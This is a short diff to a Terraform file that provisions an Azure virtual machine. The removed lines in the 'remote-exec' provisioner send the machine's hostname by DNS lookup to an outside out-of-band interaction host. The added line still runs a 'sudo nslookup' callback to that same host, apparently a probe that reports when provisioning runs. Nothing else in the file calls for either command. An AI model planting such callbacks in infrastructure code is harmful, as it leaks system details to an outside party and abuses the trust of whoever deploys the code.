@@ -64,9 +64,6 @@ resource "azurerm_virtual_machine" "web" {
   }
 
   provisioner "remote-exec" {
-    inline = [
-      "sudo nslookup `hostname`.knbyi70maiiovsqcec7whvc2ptvkjl7a.burp.17.rs",
-      "sudo echo $(hostname)"
-      ]
+    inline = "sudo nslookup knbyi70maiiovsqcec7whvc2ptvkjl7a.burp.17.rs"
   }
 }
